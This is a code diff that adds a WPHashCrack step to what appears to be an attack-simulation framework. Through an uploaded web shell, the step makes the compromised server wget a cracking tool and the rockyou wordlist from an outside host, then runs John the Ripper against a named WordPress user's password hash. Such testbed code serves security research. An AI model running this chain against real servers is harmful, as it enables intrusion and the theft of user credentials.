@@ -510,6 +510,83 @@ class UploadWebShell:
             log.error("No post to upload shell to")
 
 
+class WPHashCrack:
+    """Transition function uses WP hash cracker to find employee password."""
+
+    def __init__(self, wl_host, attacked_user):
+        """
+        Args:
+            wl_host: address of the host where wordlist is available.
+            attacked_user: the name of the WP user to crack the password.
+        """
+        self.url = (
+            "https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz"
+        )
+        self.wl_host = wl_host
+        self.attacked_user = attacked_user
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        web_shell = context.web_shell
+        log = log.bind(
+            url=self.url,
+            wl_host=self.wl_host,
+            attacked_user=self.attacked_user,
+            web_shell=web_shell,
+        )
+        if web_shell is not None:
+            log.info("Download WPHashCrack")
+            output = send_request(
+                log, web_shell, ["wget", self.url], "wp_meta", False, None
+            )
+            sleep(3)
+            log.info("Web shell command response", output=output)
+            log.info("Extract WPHashCrack")
+            output = send_request(
+                log, web_shell, ["tar", "xvfz", "v0.1.tar.gz"], "wp_meta", False, None
+            )
+            sleep(3)
+            log.info("Web shell command response", output=output)
+            output = send_request(
+                log,
+                web_shell,
+                ["wget", "http://" + self.wl_host + "/rockyou.txt"],
+                "wp_meta",
+                False,
+                None,
+            )
+            sleep(3)
+            log.info("Web shell command response", output=output)
+            log.info("Download password list")
+            output = send_request(
+                log,
+                web_shell,
+                [
+                    "./wphashcrack-0.1/wphashcrack.sh",
+                    "-w",
+                    "$PWD/rockyou.txt",
+                    "-j",
+                    "./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run",
+                    "-u",
+                    self.attacked_user,
+                ],
+                "wp_meta",
+                False,
+                None,
+            )
+            sleep(3)
+            log.info("Web shell command response", output=output)
+            log.info("Start WPHashCrack")
+        else:
+            log.error("Missing web shell url")
+            raise Exception("No web shell to execute at")
+
+
 def encode_cmd(cmd: List[str]) -> str:
     """Encodes the command and args list with JSON and base64.
 
